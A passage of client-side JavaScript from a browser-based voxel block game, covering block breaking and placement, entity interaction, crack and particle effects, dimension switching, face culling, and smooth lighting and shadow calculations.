	 		  vertexAttribPointer("aTexture", program3D, "aTexture", 2, texCoordsBuffers[textureMap[tex[i]]])
				gl.drawArrays(gl.TRIANGLES, 6, gl.UNSIGNED_INT, 0) //doesn't work
			}
    }*/
		if (blockOutlines) {
      gl.disableVertexAttribArray(glCache.aSkylight)
      gl.disableVertexAttribArray(glCache.aBlocklight)
      gl.vertexAttrib1f(glCache.aSkylight, 1.0)
      gl.vertexAttrib1f(glCache.aBlocklight, 1.0)
      
			vertexAttribPointer("aVertex", program3D, "aVertex", 3, hitBox.shape.buffer)
			vertexAttribPointer("aTexture", program3D, "aTexture", 2, texCoordsBuffers[textureMap.hitbox])
			for (let i = 0; i < hitBox.shape.size; i++) {
				gl.drawArrays(gl.LINE_LOOP, i * 4, 4)
			}
    }
	}
	let tempTex = new Array(6)
	function block2(x, y, z, t, camera) {
		if (camera) {
			camera.transformation.translate(x, y, z)
			uniformMatrix("view3d", program3D, "uView", false, camera.getMatrix())
		} else {
			//copyArr(modelView, matrix)
			trans(modelView, x, y, z)
			matMult()
			trans(modelView, -x, -y, -z)
			transpose(matrix)
			uniformMatrix("view3d", program3D, "uView", false, matrix)
		}
    box2(0xff, typeof t === "string" ? tempTex.fill(t) : blockData[t].textures)
	}

	function changeWorldBlock() {
		if(!hitBox.pos || p.spectator) return
    p.punchEffect = 10 //easy to understand
    
		let pos = hitBox.pos

		if(!world.isMK){
			p.lastBreak = Date.now()
			send({type:"break",x:pos[0],y:pos[1],z:pos[2],})
			return
		}
		if(pos && pos[1] >= minHeight && pos[1] < maxHeight) {
			let prevBlock = world.getBlock(pos[0],pos[1],pos[2],p.dimension)
			world.setBlock(pos[0],pos[1],pos[2], 0, false,true,true,false,p.dimension)
			p.lastBreak = Date.now()
			send({type:"serverChangeBlock",x:pos[0],y:pos[1],z:pos[2],dimension:p.dimension,place:false,face:hitBox.face,shift:p.sneaking,blockMode:0,rotate:0,flip:0})
		}
	}
  /*function replaceItem(id){
		inventory.hotbar[inventory.hotbarSlot] = {id,animation:1.5,amount:1}
    updateHUD = true
  }*/
  function getPosition(){
    let pos = hitBox.pos, x = pos[0], y = pos[1], z = pos[2]
    let side = false
		switch(hitBox.face) {
			case "top":
				y += 1
				break
			case "bottom":
				y -= 1
				break
			case "south":
				z -= 1
        side = true
				break
			case "north":
				z += 1
        side = true
				break
			case "west":
				x -= 1
        side = true
				break
			case "east":
				x += 1
        side = true
				break
		}
    pos[0] = x
    pos[1] = y
    pos[2] = z
    return pos
  }
  /*function useDurability(d){
    if(p.survival && inventory.hotbar[inventory.hotbarSlot]){
      inventory.hotbar[inventory.hotbarSlot].durability -= d
      inventory.hotbar[inventory.hotbarSlot].animation = 1.5
      updateHUD = true
    }
  }
  function minusOne(){
    if(!p.survival) return
    inventory.hotbar[inventory.hotbarSlot].amount --
    inventory.hotbar[inventory.hotbarSlot].animation = 1.5
    updateHUD = true
  }*/
	function newWorldBlock(repeat) {
		if(p.spectator) return
    let pos = hitBox.pos,x,y,z, face = hitBox.face
    if(pos) x = pos[0], y = pos[1], z = pos[2]
    let cblock = pos ? world.getBlock(x, y, z, p.dimension) : 0
		
		if(!world.isMK){
			if(!hitBox.pos) return
			p.lastPlace = Date.now()
			send({type:"place",x:hitBox.pos[0],y:hitBox.pos[1],z:hitBox.pos[2], cx: (p.direction.x*hitBox.closest-(hitBox.pos[0]-round(p.x))), cy: (p.direction.y*hitBox.closest-(hitBox.pos[1]-round(p.y))), cz: (p.direction.z*hitBox.closest-(hitBox.pos[2]-round(p.z))) })
			return
		}
    
    let adjholding = holding
    if(adjholding && pos && blockData[adjholding].useAs){
      var useAs = blockData[adjholding].useAs
      if(typeof useAs === "function"){
        useAs = useAs(x,y,z,cblock,face)
        if(typeof useAs === "string" && blockIds[useAs]){
          adjholding = blockIds[useAs]
        }else adjholding = useAs
      }else{
        adjholding = blockIds[useAs]
      }
    }

		try{
		
		let mode = adjholding < isCube && !blockData[adjholding].item ? blockMode : 0
		let rotate = 0, flip = 0
		let pi = Math.PI / 4
		if (p.ry <= pi) {
			rotate = "north"
		}else if (p.ry < 3 * pi) {
			rotate = "west"
		} else if (p.ry < 5 * pi) {
			rotate = "south"
		} else if (p.ry < 7 * pi) {
			rotate = "east"
		}
		if (hitBox.face !== "top" && (hitBox.face === "bottom" || (p.direction.y * hitBox.closest + p.y+p.cOffsetY) % 1 < 0.5)) {
			flip = FLIP
		}
		let predictBlock = adjholding|mode
		let shape = adjholding && blockData[predictBlock].shape
		//if (shape && shape.rotate) predictBlock |= rotate//todo n
		//if (shape && shape.flip) predictBlock |= flip
    
		if(hitBox.pos){
			let onclick = blockData[cblock].onclientclick
			if(onclick && !controlMap.sneak.pressed){
				if(!onclick(x, y, z, p.dimension, world)){p.lastPlace = Date.now(); p.punchEffect = 10; return} //if it doesn't return true
			}
		}
    var item = adjholding && blockData[adjholding].item
    if(adjholding && blockData[adjholding].canPlace && !blockData[adjholding].canPlace(cblock)){
      item = true
    }
		if(item){
			send({type:"serverChangeBlock",x:pos?pos[0]:p2.x,y:pos?pos[1]:p2.y,z:pos?pos[2]:p2.z,dimension:p.dimension,place:true,face:hitBox.face,shift:p.sneaking,blockMode,rotate,flip})
			p.lastPlace = Date.now()
			if(blockData[adjholding].onuse && pos) blockData[adjholding].onuse(x,y,z, cblock,p.dimension)
			return
		}
		if(cblock && blockData[cblock].onclick){
			p.lastPlace = Date.now()
			send({type:"serverChangeBlock",x,y,z,dimension:p.dimension,place:true,face:hitBox.face,shift:p.sneaking,blockMode,rotate,flip})
			return
		}
		if(!hitBox.pos || !adjholding) {
			return
		}
		let nx = x, ny = y, nz = z
		switch(hitBox.face) {
			case "top":
				ny += 1
				break
			case "bottom":
				ny -= 1
				break
			case "south":
				nz -= 1
				break
			case "north":
				nz += 1
				break
			case "west":
				nx -= 1
				break
			case "east":
				nx += 1
				break
		}
    
    var hitboxBlock = world.getBlock(nx, ny, nz, p.dimension)
    var blocking = blockData[adjholding].solid && inBox(nx, ny, nz, 1, 1, 1)
    var canPlace = (!hitboxBlock) || (blockData[hitboxBlock].noHitbox)
		if (!blocking && canPlace) {
			pos[0] = nx, pos[1] = ny, pos[2] = nz
			//changeWorldBlock(block < isCube && !blockData[block].item ? (block | blockMode) : block)if(pos && pos[1] >= minHeight && pos[1] < maxHeight) {
			if(pos && pos[1] >= minHeight && pos[1] < maxHeight){
				world.setBlock(nx,ny,nz, predictBlock, false,true,true,false,p.dimension)
				p.lastPlace = Date.now()
				send({type:"serverChangeBlock",x,y,z,dimension:p.dimension,place:true,face:hitBox.face,shift:p.sneaking,blockMode:mode,rotate,flip})
			}
      //if(p.survival) inventory.hotbar[inventory.hotbarSlot].animation = 1.5 //animation because you used one of the blocks
      
      /*if(p.survival && inventory.hotbar[inventory.hotbarSlot]){
        inventory.hotbar[inventory.hotbarSlot].amount --;
        updateHUD = true
      }*/
      
      //play sound
      blockSound(predictBlock, "place", x,y,z)
		}
		}catch(e){e.message+="\nholding:"+holding+" adjholding"+adjholding;throw e}
	}
  
  function entClick(){
    p.punchEffect = 10
    
    let ent = entHitbox.ent
    if(!ent) return
		if(p.spectator){
			p.spectating = ent
			return
		}
    let block = blockData[holding]
    let atime = (typeof block.attackTime === "number") ? block.attackTime : 5
		attackCooldownStart = Date.now()
		attackCooldownTime = atime
    let time = (Date.now() - p.lastBreak) / 1000 * tickSpeed
		send({type:"entInteract",data:ent.id,hit:true,cooldown: 0.2 + ((time + 0.5) / atime) ** 2 * 0.8})
    /*var block = blockData[holding || 0]
    var holdObj = inventory.hotbar[inventory.hotbarSlot]
    var atime = (typeof block.attackTime === "number") ? block.attackTime : 5
    var time = (Date.now() - p.lastBreak) / 1000 * tickSpeed
    var attackDamage = (block && block.attackDamage) || 1
    var damage, critical
    damage = atime ? (0.2 + ((time + 0.5) / atime) ** 2 * 0.8) : 1
    if(p.velocity.y < 0 && !p.onGround && !liquid && !p.flying && !p.sprinting && damage > 0.848) critical = true
    damage = max(min(damage, 1), 0.2) * attackDamage
    if(critical) damage *= 1.5
    if(entHitbox.player){
      if (worldSettings.attack) {
        let pd = p.direction
        send({type:"hit", username:p.username, id:p.id, damage:damage, velx:pd.x/2, velz:pd.z/2, holding:inventory.hotbar[inventory.hotbarSlot],x:p.x,y:p.y,z:p.z}, ent.id)
      }
    }else{
			let pd = p.direction
			send({type:"hit", isEntity:true, username:p.username, id:p.id, damage:damage, velx:pd.x/2, velz:pd.z/2, holding:inventory.hotbar[inventory.hotbarSlot],x:p.x,y:p.y,z:p.z}, ent.id)
      /*if(ent.onhit){
        var pd = p.direction
        ent.onhit(damage, false, pd.x/2,pd.z/2, p.id)
      }*-/
    }
    if(block.pickaxe){
      holdObj.durability -= 2
      holdObj.animation = 1.5
    }
    if(block.sword){
      holdObj.durability --
      holdObj.animation = 1.5
    }
    if(block.shovel){
      holdObj.durability -= 2
      holdObj.animation = 1.5
    }
    if(block.axe){
      holdObj.durability -= 2
      holdObj.animation = 1.5
    }
    if(atime){
      attackCooldownStart = Date.now()
      attackCooldownTime = atime
    }
    //console.log(damage)
    p.foodExhaustion += 0.1
    p.lastBreak = Date.now()*/
  }
  function entInteract(){
    p.punchEffect = 10
    let ent = entHitbox.ent
    if(!ent || p.spectator) return
		send({type:"entInteract",data:ent.id,hit:false,cooldown:0})
    /*let holdObj = inventory.hotbar[inventory.hotbarSlot]
		let block = blockData[holdObj && holdObj.id || 0]
    if(block.onentityuse){
      if(!block.onentityuse(ent,replaceItem,useDurability,minusOne,holdObj)){
				p.lastPlace = Date.now()
				send({type:"entClick",id:ent.id,fromItem:holdObj})
				return
			}
    }
    if(ent.onclick){
			if(!ent.onclick(holdObj.id,replaceItem,useDurability,minusOne)){
				send({type:"entClick",id:ent.id,holding:holdObj.id})
				p.lastPlace = Date.now()
			}
    }*/
  }

  function cracks(){
    let dnow = Date.now()
    let block = hitBox.pos ? world.getBlock(hitBox.pos[0], hitBox.pos[1], hitBox.pos[2], p.dimension) : 0
    let touchBreak = pTouch.touching && pTouch.canDig && dnow - pTouch.touchStart > touchMoveLimit
    let repeatClickBreak = now - p.lastStartBreak < 500
    let breakingStart = (controlMap.break.pressed && !Key.control || repeatClickBreak || touchBreak) && block
    let breaking = breakingStart && (now - crack.delayStart >= crack.delayBetween)
    if(hitBox.pos && !arrayValuesEqual(crack.prevPos, hitBox.pos)){
      crack.prevPos = hitBox.pos
      crack.soundTimer = 0
      crack.breakStart = now
			if(breakingStart) send({type:"startBreak",x:hitBox.pos[0],y:hitBox.pos[1],z:hitBox.pos[2]})
    }
    if(breaking){
      let usingTool = false
      let breakTime = blockData[block].hardness*1000
      let harvestTools = blockData[block].harvestTools
			if(harvestTools === true || harvestTools && harvestTools.includes(holding)){
				breakTime *= 1.5
	      if(holding && blockData[holding].mineSpeed){
	        breakTime /= blockData[holding].mineSpeed
	        usingTool = true
	      }
			}else breakTime *= 5
      if(holding && blockData[holding].shears && blockData[block].shearBreakTime){
        breakTime = blockData[block].shearBreakTime
        usingTool = true
      }
      if(p.inLiquid) breakTime *= 5
			if(!p.onGround) breakTime *= 5
      let prog = map(now, crack.breakStart,crack.breakStart+breakTime, 0,1)
      crack.idx = floor(prog * crack.length)
      crack.tex = crack[crack.idx]
      pTouch.digProg = prog
      crack.soundTimer ++
      if(crack.soundTimer > 5){
        crack.soundTimer -= 5
        blockSound(block, "breaking", hitBox.pos[0], hitBox.pos[1], hitBox.pos[2])
        var x = hitBox.pos[0], y = hitBox.pos[1], z = hitBox.pos[2]
        blockParticles(block, x,y,z, 4, "breaking", world,p.dimension,hitBox.face)
        /*if(!usingTool && blockData[block].damage){
          var type = blockData[block].burnEnt ? "fire" : ""
          damage(blockData[block].damage/2, p.username+" died while punching "+blockData[block].Name+".", false, type, x,y,z)
          if(blockData[block].burnEnt) p.burnTimer += 1
        }*/
        p.punchEffect = 10
      }
      if(crack.idx >= crack.length){
        changeWorldBlock()
        p.foodExhaustion += 0.005
        crack.prevPos = hitBox.pos
        crack.soundTimer = 0
        crack.delayStart = now
        crack.breakStart = now
				crack.idx = -1
      }
    }else{
			if(crack.idx !== -1 && !world.isMK && hitBox.pos) send({type:"stopBreak",x:hitBox.pos[0],y:hitBox.pos[1],z:hitBox.pos[2]})
      crack.idx = -1
      crack.breakStart = now
      crack.soundTimer = 0
      pTouch.digProg = 0
    }
  }
  
  function blockParticles(block,x,y,z,amount, type, w = world, dimension, dir, remote){
    let world = w
    if(!performFast) for(var i=0; i<amount; i++) {
			let tex = floor(rand(6))
      let ax = x, ay = y, az = z
      if(type === "break"){
        ax += rand(-0.4,0.4)
        ay += rand(-0.4,0.4)
        az += rand(-0.4,0.4)
      }else if(type === "breaking"){
        switch(dir) {
          case "top":
            ay += 0.5
            ax += rand(-0.5,0.5)
            az += rand(-0.5,0.5)
						tex = 1
            break
          case "bottom":
            ay -= 0.5
            ax += rand(-0.5,0.5)
            az += rand(-0.5,0.5)
						tex = 0
            break
          case "south":
            az -= 0.5
            ax += rand(-0.5,0.5)
            ay += rand(-0.5,0.5)
						tex = 3
            break
          case "north":
            az += 0.5
            ax += rand(-0.5,0.5)
            ay += rand(-0.5,0.5)
						tex = 2
            break
          case "west":
            ax -= 0.5
            ay += rand(-0.5,0.5)
            az += rand(-0.5,0.5)
						tex = 5
            break
          case "east":
            ax += 0.5
            ay += rand(-0.5,0.5)
            az += rand(-0.5,0.5)
						tex = 4
            break
        }
      }else if(type === "player") tex = 1//actually stepping
      world.addParticle(new entities[entityIds.BlockParticle]((blockData[block].shape.textureSelectors && blockData[block].shape.textureSelectors.particle) || blockData[block].textures[2], ax,ay,az, type, block), dimension)
    }
    if(!remote) send({
      type:"particles", particleType:"blockParticles",
      x,y,z,amount,dimension,data:{block,thisType:type,dir}
    })
  }

	function areChunksLoaded(){
		/*let cx = p.x >> 4
		let cz = p.z >> 4

		const chunks = p.dimension === "nether" ? world.netherChunks : (p.dimension === "end" ? world.endChunks : world.chunks)

		for (let x = cx - 1; x <= cx + 1; x++) {
			for (let z = cz - 1; z <= cz + 1; z++) {
				if (!chunks[x] || !chunks[x][z] || !chunks[x][z].buffer) {
					return false
				}
			}
		}*/
		world.loadChunks()
		return !world.neededChunks.length
	}
  
  function goToDimension(d){
    d = d || ""
    if(d === p.dimension) return
		if(inWorld) world.unloadAllChunks()
    if(d === "nether"){
      p.dimension = "nether"
			if(inWorld) changeScene("netherLoading")
    }else if(d === "end"){
      p.dimension = "end"
			if(inWorld) changeScene("endLoading")
    }else{
      p.dimension = ""
			if(inWorld) changeScene("loading")
    }
		releasePointer()
  }
	function goToLoadScreen(){
		if(p.dimension === "nether") changeScene("netherLoading")
		else if(p.dimension === "end") changeScene("endLoading")
		else changeScene("loading")
		releasePointer()
	}
  win.goToDimension = goToDimension

	let renderedChunks = 0, renderedEntities = 0, totalEntites = 0
	function getBlock(x, y, z, blocks) {
		return blocks[((x >> 4) + 1) * 9 + ((z >> 4) + 1) * 3 + (y >> 4) + 1][((x & 15) << 8) + ((y & 15) << 4) + (z & 15)]
	}
	/**
	 * Returns true if the face is exposed and should be drawn, or false if the face is hidden
	 * 
	 * @param {number} x - The X coordinate of the block that may be covering a face
	 * @param {number} y - The Y coordinate of the block that may be covering a face
	 * @param {number} z - The Z coordinate of the block that may be covering a face
	 * @param {Collection} blocks - Some collection of blocks that can return the block at (x, y, z)
	 * @param {number} type - The blockstate of the block that's being considered for face culling
	 * @param {function} func - The function that can be called to return a block from the blocks collection

(sourceRange & hiderRange) !== sourceRange || sourceRange === 0
			source
h    00 01 10 11
i 00 y  y  y  y
d 01 y  n  y  y
e 10 y  y  n  y
r 11 y  n  n  n
	*/
	function hideFace(x, y, z, blocks, type, func, sourceDir, dir, section, sx,sy,sz) {
		let block = func.call(world, x, y, z, (func === getBlock ? blocks : section.type))
		if (!block) return 1

		let data = blockData[block]
		let sourceData = blockData[type || 0]
		if(sourceData.customCullFace && sourceData.customCullFace(x,y,z,section.type,block,type,sourceDir,dir,data,sourceData,func,blocks,sx,sy,sz)) return 0
    
		let sourceRange = sourceData.shape.cull[sourceDir]
		let hiderRange = data.cullFace === undefined ? data.shape.cull[dir] : data.cullFace

		return (sourceRange & hiderRange) !== sourceRange || sourceRange === 0 || block !== type && data.transparent
	}
	/*let defaultRandomRotate = 1<<2|2<<4|3<<6
	defaultRandomRotate = defaultRandomRotate + defaultRandomRotate*256 + defaultRandomRotate*256**2 + defaultRandomRotate*256**3 + defaultRandomRotate*256**4 + defaultRandomRotate*256**5
	function getRandomRotate(blockId,x,y,z,sides){
		let block = blockData[blockId]
		let randomRotate
		const {performanceFast} = settings
		if(performanceFast) return defaultRandomRotate
		if(block.randomRotate === "pattern"){
		}else if(block.randomRotate){
			randomRotate = hash3(x,y,z)
			if(block.randomRotate === "flip") randomRotate = floor(randomRotate*2)*2
			else randomRotate = floor(randomRotate*4)
		}else return defaultRandomRotate
		let texIdx0, texIdx1, texIdx2, texIdx3
		let data = 0
		for (let n = 0; n < 6; n++) {
			const side = blockSides[n]
			if (sides & Block[side]) {
				if(block.randomRotate === "pattern"){
					let i, j, e
					if(n === 0 || n === 1){
						i = z, j = x, e = y
					}else if(n === 2 || n === 3){
						i = y, j = x, e = z
					}else{
						i = y, j = z, e = x
					}
					if(mod(i,2)){
						randomRotate = mod(j,2)
					}else{
						randomRotate = 3-mod(j,2)
					}
				}
				let offset = (side === "top" && block.randomRotateTop || side === "bottom" && block.randomRotateBottom || side === "north" && block.randomRotateNorth || side === "east" && block.randomRotateEast || side === "south" && block.randomRotateSouth || side === "west" && block.randomRotateWest) ? randomRotate : 0
				texIdx0 = offset
				texIdx1 = (offset + 1) % 4
				texIdx2 = (offset + 2) % 4
				texIdx3 = (offset + 3) % 4
				data += (texIdx0 | texIdx1 << 2 | texIdx2 << 4 | texIdx3 << 6) * 256**n //uses multiplication because bitwise operators are limited to 32 bits
			}
		}
		return data
	}*/
	let getShadows = {
		shade: [1, 0.85, 0.7, 0.6, 0.3],
		ret: [],
		blocks: [],
		bottom: function(x, y, z, block) {
			let blocks = this.blocks
      let data = blockData[getBlock(x, y, z, block)]
			let ret = this.ret
      if(!data.lightLevel && data.shade){
        blocks[0] = blockData[getBlock(x-1, y-1, z-1, block)].shadow
        blocks[1] = blockData[getBlock(x, y-1, z-1, block)].shadow
        blocks[2] = blockData[getBlock(x+1, y-1, z-1, block)].shadow
        blocks[3] = blockData[getBlock(x-1, y-1, z, block)].shadow
        blocks[4] = blockData[getBlock(x, y-1, z, block)].shadow
        blocks[5] = blockData[getBlock(x+1, y-1, z, block)].shadow
        blocks[6] = blockData[getBlock(x-1, y-1, z+1, block)].shadow
        blocks[7] = blockData[getBlock(x, y-1, z+1, block)].shadow
        blocks[8] = blockData[getBlock(x+1, y-1, z+1, block)].shadow

        ret[0] = this.shade[blocks[0] + blocks[1] + blocks[3] + blocks[4]]
        ret[1] = this.shade[blocks[1] + blocks[2] + blocks[4] + blocks[5]]
        ret[2] = this.shade[blocks[5] + blocks[4] + blocks[8] + blocks[7]]
        ret[3] = this.shade[blocks[4] + blocks[3] + blocks[7] + blocks[6]]
      }else{
        ret[0] = ret[1] = ret[2] = ret[3] = 1
      }

			return ret
		},
		top: function(x, y, z, block) { // Actually the top
			let blocks = this.blocks
      let data = blockData[getBlock(x, y, z, block)]
			let ret = this.ret
      if(!data.lightLevel && data.shade){
        blocks[0] = blockData[getBlock(x-1, y+1, z-1, block)].shadow
        blocks[1] = blockData[getBlock(x, y+1, z-1, block)].shadow
        blocks[2] = blockData[getBlock(x+1, y+1, z-1, block)].shadow
        blocks[3] = blockData[getBlock(x-1, y+1, z, block)].shadow
        blocks[4] = blockData[getBlock(x, y+1, z, block)].shadow
        blocks[5] = blockData[getBlock(x+1, y+1, z, block)].shadow
        blocks[6] = blockData[getBlock(x-1, y+1, z+1, block)].shadow
        blocks[7] = blockData[getBlock(x, y+1, z+1, block)].shadow
        blocks[8] = blockData[getBlock(x+1, y+1, z+1, block)].shadow

        ret[0] = this.shade[blocks[4] + blocks[3] + blocks[7] + blocks[6]]
        ret[1] = this.shade[blocks[5] + blocks[4] + blocks[8] + blocks[7]]
        ret[2] = this.shade[blocks[1] + blocks[2] + blocks[4] + blocks[5]]
        ret[3] = this.shade[blocks[0] + blocks[1] + blocks[3] + blocks[4]]
      }else{
        ret[0] = ret[1] = ret[2] = ret[3] = 1
      }
			return ret
		},
		north: function(x, y, z, block) {
			let blocks = this.blocks
      let data = blockData[getBlock(x, y, z, block)]
			let ret = this.ret
      if(!data.lightLevel && data.shade){
        blocks[0] = blockData[getBlock(x-1, y-1, z+1, block)].shadow
        blocks[1] = blockData[getBlock(x, y-1, z+1, block)].shadow
        blocks[2] = blockData[getBlock(x+1, y-1, z+1, block)].shadow
        blocks[3] = blockData[getBlock(x-1, y, z+1, block)].shadow
        blocks[4] = blockData[getBlock(x, y, z+1, block)].shadow
        blocks[5] = blockData[getBlock(x+1, y, z+1, block)].shadow
        blocks[6] = blockData[getBlock(x-1, y+1, z+1, block)].shadow
        blocks[7] = blockData[getBlock(x, y+1, z+1, block)].shadow
        blocks[8] = blockData[getBlock(x+1, y+1, z+1, block)].shadow

        ret[0] = this.shade[blocks[5] + blocks[4] + blocks[8] + blocks[7]]
        ret[1] = this.shade[blocks[4] + blocks[3] + blocks[7] + blocks[6]]
        ret[2] = this.shade[blocks[0] + blocks[1] + blocks[3] + blocks[4]]
        ret[3] = this.shade[blocks[1] + blocks[2] + blocks[4] + blocks[5]]
      }else{
        ret[0] = ret[1] = ret[2] = ret[3] = 1
      }
			return ret
		},
		south: function(x, y, z, block) {
			let blocks = this.blocks
      let data = blockData[getBlock(x, y, z, block)]
			let ret = this.ret
      if(!data.lightLevel && data.shade){
        blocks[0] = blockData[getBlock(x-1, y-1, z-1, block)].shadow
        blocks[1] = blockData[getBlock(x-1, y, z-1, block)].shadow
        blocks[2] = blockData[getBlock(x-1, y+1, z-1, block)].shadow
        blocks[3] = blockData[getBlock(x, y-1, z-1, block)].shadow
        blocks[4] = blockData[getBlock(x, y, z-1, block)].shadow
        blocks[5] = blockData[getBlock(x, y+1, z-1, block)].shadow
        blocks[6] = blockData[getBlock(x+1, y-1, z-1, block)].shadow
        blocks[7] = blockData[getBlock(x+1, y, z-1, block)].shadow
        blocks[8] = blockData[getBlock(x+1, y+1, z-1, block)].shadow

        ret[0] = this.shade[blocks[1] + blocks[2] + blocks[4] + blocks[5]]
        ret[1] = this.shade[blocks[5] + blocks[4] + blocks[8] + blocks[7]]
        ret[2] = this.shade[blocks[4] + blocks[3] + blocks[7] + blocks[6]]
        ret[3] = this.shade[blocks[0] + blocks[1] + blocks[3] + blocks[4]]
      }else{
        ret[0] = ret[1] = ret[2] = ret[3] = 1
      }
			return ret
		},
		east: function(x, y, z, block) {
			let blocks = this.blocks
      let data = blockData[getBlock(x, y, z, block)]
			let ret = this.ret
      if(!data.lightLevel && data.shade){
        blocks[0] = blockData[getBlock(x+1, y-1, z-1, block)].shadow
        blocks[1] = blockData[getBlock(x+1, y, z-1, block)].shadow
        blocks[2] = blockData[getBlock(x+1, y+1, z-1, block)].shadow
        blocks[3] = blockData[getBlock(x+1, y-1, z, block)].shadow
        blocks[4] = blockData[getBlock(x+1, y, z, block)].shadow
        blocks[5] = blockData[getBlock(x+1, y+1, z, block)].shadow
        blocks[6] = blockData[getBlock(x+1, y-1, z+1, block)].shadow
        blocks[7] = blockData[getBlock(x+1, y, z+1, block)].shadow
        blocks[8] = blockData[getBlock(x+1, y+1, z+1, block)].shadow

        ret[0] = this.shade[blocks[1] + blocks[2] + blocks[4] + blocks[5]]
        ret[1] = this.shade[blocks[5] + blocks[4] + blocks[8] + blocks[7]]
        ret[2] = this.shade[blocks[4] + blocks[3] + blocks[7] + blocks[6]]
        ret[3] = this.shade[blocks[0] + blocks[1] + blocks[3] + blocks[4]]
      }else{
        ret[0] = ret[1] = ret[2] = ret[3] = 1
      }
			return ret
		},
		west: function(x, y, z, block) {
			let blocks = this.blocks
      let data = blockData[getBlock(x, y, z, block)]
			let ret = this.ret
      if(!data.lightLevel && data.shade){
        blocks[0] = blockData[getBlock(x-1, y-1, z-1, block)].shadow
        blocks[1] = blockData[getBlock(x-1, y, z-1, block)].shadow
        blocks[2] = blockData[getBlock(x-1, y+1, z-1, block)].shadow
        blocks[3] = blockData[getBlock(x-1, y-1, z, block)].shadow
        blocks[4] = blockData[getBlock(x-1, y, z, block)].shadow
        blocks[5] = blockData[getBlock(x-1, y+1, z, block)].shadow
        blocks[6] = blockData[getBlock(x-1, y-1, z+1, block)].shadow
        blocks[7] = blockData[getBlock(x-1, y, z+1, block)].shadow
        blocks[8] = blockData[getBlock(x-1, y+1, z+1, block)].shadow

        ret[0] = this.shade[blocks[7] + blocks[8] + blocks[4] + blocks[5]]
        ret[1] = this.shade[blocks[5] + blocks[4] + blocks[2] + blocks[1]]
        ret[2] = this.shade[blocks[4] + blocks[3] + blocks[1] + blocks[0]]
        ret[3] = this.shade[blocks[6] + blocks[7] + blocks[3] + blocks[4]]
      }else{
        ret[0] = ret[1] = ret[2] = ret[3] = 1
      }
			return ret
		},
	}
	
	function average(l, a, b, c, d) {
		a = l[a]
		b = l[b]
		c = l[c]
		d = l[d]
		let count = 1
		let zero = 0
		let total = a
		if (b && abs(a-b) <= 2) {
			total += b
			count++
		} else zero++
		if (c && abs(a-c) <= 2) {
			total += c
			count++
		} else zero++
		if (d && abs(a-d) <= 2) {
			total += d
			count++
		} else zero++

		let mx = max(a, b, c, d)
		if (mx > 2) {
			return total / (count * 15)
		}
		if (mx > 1) {
			return zero ? total / (count * 15 + 15) : total / (count * 15)
		}
		return (total) / 60
	}
	let getLight = {
		blocks: [],
		bottom: function(x, y, z, block, ret, blockLight = 0, data, x2,y2,z2) {
      if(!data.smoothLight){
        let light = (getBlock(x, y, z, block) & 15) / 15
        if(data.name === "redstoneDust" && blockLight) light = max(light,world.getPower(x2,y2,z2)/30)
        ret[0] = light
        ret[1] = light
        ret[2] = light
        ret[3] = light
        return ret
      }

			let blocks = this.blocks
      blocks[0] = (getBlock(x-1, y-1, z-1, block) & 15)
      blocks[1] = (getBlock(x, y-1, z-1, block) & 15)
      blocks[2] = (getBlock(x+1, y-1, z-1, block) & 15)
      blocks[3] = (getBlock(x-1, y-1, z, block) & 15)
      blocks[4] = (getBlock(x, y-1, z, block) & 15)
      blocks[5] = (getBlock(x+1, y-1, z, block) & 15)
      blocks[6] = (getBlock(x-1, y-1, z+1, block) & 15)
      blocks[7] = (getBlock(x, y-1, z+1, block) & 15)
      blocks[8] = (getBlock(x+1, y-1, z+1, block) & 15)

      ret[0] = average(blocks, 4, 0, 1, 3)
      ret[1] = average(blocks, 4, 1, 2, 5)
      ret[2] = average(blocks, 4, 5, 7, 8)
      ret[3] = average(blocks, 4, 3, 6, 7)
			return ret
		},
		top: function(x, y, z, block, ret, blockLight = 0, data, x2,y2,z2) {
      if(!data.smoothLight){
        let light = (getBlock(x, y, z, block) & 15) / 15
        if(data.name === "redstoneDust" && blockLight) light = max(light,world.getPower(x2,y2,z2)/30)
        ret[0] = light
        ret[1] = light
        ret[2] = light
        ret[3] = light
        return ret
      }

			let blocks = this.blocks
			blocks[0] = (getBlock(x-1, y+1, z-1, block) & 15)
      blocks[1] = (getBlock(x, y+1, z-1, block) & 15)
      blocks[2] = (getBlock(x+1, y+1, z-1, block) & 15)
      blocks[3] = (getBlock(x-1, y+1, z, block) & 15)
      blocks[4] = (getBlock(x, y+1, z, block) & 15)
      blocks[5] = (getBlock(x+1, y+1, z, block) & 15)
      blocks[6] = (getBlock(x-1, y+1, z+1, block) & 15)
      blocks[7] = (getBlock(x, y+1, z+1, block) & 15)
      blocks[8] = (getBlock(x+1, y+1, z+1, block) & 15)

      ret[0] = average(blocks, 4, 3, 6, 7)
      ret[1] = average(blocks, 4, 5, 7, 8)
      ret[2] = average(blocks, 4, 1, 2, 5)
      ret[3] = average(blocks, 4, 0, 1, 3)
			return ret
		},
		north: function(x, y, z, block, ret, blockLight = 0, data, x2,y2,z2) {
      if(!data.smoothLight){
        let light = (getBlock(x, y, z, block) & 15) / 15
        if(data.name === "redstoneDust" && blockLight) light = max(light,world.getPower(x2,y2,z2)/30)
        ret[0] = light
        ret[1] = light
        ret[2] = light
        ret[3] = light
        return ret
      }

			let blocks = this.blocks
      blocks[0] = (getBlock(x-1, y-1, z+1, block) & 15)
      blocks[1] = (getBlock(x, y-1, z+1, block) & 15)
      blocks[2] = (getBlock(x+1, y-1, z+1, block) & 15)
      blocks[3] = (getBlock(x-1, y, z+1, block) & 15)
      blocks[4] = (getBlock(x, y, z+1, block) & 15)
      blocks[5] = (getBlock(x+1, y, z+1, block) & 15)
      blocks[6] = (getBlock(x-1, y+1, z+1, block) & 15)
      blocks[7] = (getBlock(x, y+1, z+1, block) & 15)
      blocks[8] = (getBlock(x+1, y+1, z+1, block) & 15)

			ret[0] = average(blocks, 4, 5, 7, 8)
			ret[1] = average(blocks, 4, 3, 6, 7)
			ret[2] = average(blocks, 4, 0, 1, 3)
			ret[3] = average(blocks, 4, 1, 2, 5)
			return ret
		},
		south: function(x, y, z, block, ret, blockLight = 0, data, x2,y2,z2) {
      if(!data.smoothLight){
        let light = (getBlock(x, y, z, block) & 15) / 15
        if(data.name === "redstoneDust" && blockLight) light = max(light,world.getPower(x2,y2,z2)/30)
        ret[0] = light
        ret[1] = light
        ret[2] = light
        ret[3] = light
        return ret
      }

			let blocks = this.blocks
			blocks[0] = (getBlock(x-1, y-1, z-1, block) & 15)
      blocks[1] = (getBlock(x-1, y, z-1, block) & 15)
      blocks[2] = (getBlock(x-1, y+1, z-1, block) & 15)
